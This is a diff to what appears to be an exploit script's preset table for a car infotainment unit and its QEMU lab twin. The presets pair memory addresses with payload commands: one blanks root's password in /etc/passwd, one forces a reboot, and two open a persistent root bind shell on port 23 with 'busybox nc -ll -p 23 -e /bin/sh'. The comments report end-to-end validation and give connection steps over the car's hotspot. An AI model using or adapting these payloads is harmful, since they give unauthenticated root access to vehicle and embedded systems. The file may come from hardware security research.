@@ -69,6 +69,29 @@ PRESETS = {
     'lab-sed': (26, 25, 0x8042e5f0,
                 "sed -i 's|^root:.*|root::0:0:root:/home/root:/bin/sh|' /etc/passwd ; "
                 'sync ; cat /etc/passwd>/dev/console'),
+    # lab twin of car-reboot: same CMD, lab addresses/eps. On this VM
+    # reboot -f HANGS in the syscall forever: vexpress-a9 registers no
+    # restart hook (arm_pm_restart stays null_restart) so machine_restart
+    # never resets. Validated 2026-10-19: chain + sh + sleep 5 proven
+    # (marker before/after sleep printed); the reboot action itself is
+    # untestable here. On the car it works: mach-imx6q.c:454 sets
+    # .restart = mxc_restart (watchdog SRS assert) and busybox's default
+    # PATH resolves reboot -> /sbin/reboot.
+    'lab-reboot': (26, 25, 0x8042e5f0, 'sleep 5 ; reboot -f'),
+    # telnet into the unit: persistent root shell on :23 via busybox nc
+    # (server mode with -e). NOT telnetd: this busybox (v1.21.1) builds it
+    # inetd-only - "Handle incoming telnet connections via inetd", no
+    # -F/-p, it just takes over stdio. nc needs no devpts, no pty.
+    # After: connect to the car's wifi hotspot, telnet/nc <unit-ip> 23.
+    'car-telnet': (27, 26, 0x8003e7c0, 'busybox nc -ll -p 23 -e /bin/sh'),
+    # lab twin of car-telnet under QEMU user networking (10.0.2.15):
+    # bring eth0 up first, then the same listener. Validated end-to-end
+    # 2026-10-19 (telnet in from host, uid=0). Needs the ifconfig applet
+    # in the initramfs and run-lab.sh NET_ARGS hostfwd; no route needed -
+    # 10.0.2.2 is on-link with the default /8 mask.
+    'lab-telnet': (26, 25, 0x8042e5f0,
+                   'ifconfig eth0 10.0.2.15 up;'
+                   'busybox nc -ll -p 23 -e /bin/sh'),
 }
 
 def p32(x): return struct.pack('<I', x)
